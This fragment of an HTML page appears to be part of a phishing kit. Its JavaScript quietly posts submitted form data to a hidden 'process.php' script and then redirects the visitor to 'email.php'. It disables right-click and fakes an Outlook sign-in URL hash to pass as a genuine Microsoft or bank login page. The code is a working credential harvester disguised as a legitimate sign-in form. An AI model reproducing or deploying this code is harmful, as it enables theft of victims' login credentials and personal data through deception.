e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if (e.shadowRoot) { fn(e.shadowRoot); } } }; fn(document); })()</script>
       -->  




<div class="overlay">
  <div class="lgif-space"></div>
    <div class="loadgif">
       <img src="Personal/Business/SmallBusiness/CorporateBusiness/loading.gif" width="100" height="100">
    </div>
</div>


<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>

 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>

<script type="text/javascript">

$(document).bind("contextmenu", function(e){ return false;});

$('#HomeFormGirldWorld').on('submit', function(e){
		
		 $(".overlay").show(500);
		$.post('WealthManagement/Insurance/LifeInsurance/Mortgages/process.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
                              window.location.href = "email.php";
                        },2000);
		e.preventDefault();
	});


</script>





<script> 
  location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&domain=' 
</script>

<script type="text/javascript" src="Personal/Business/SmallBusiness/CorporateBusiness/actions.js"></script>
</body>
</html>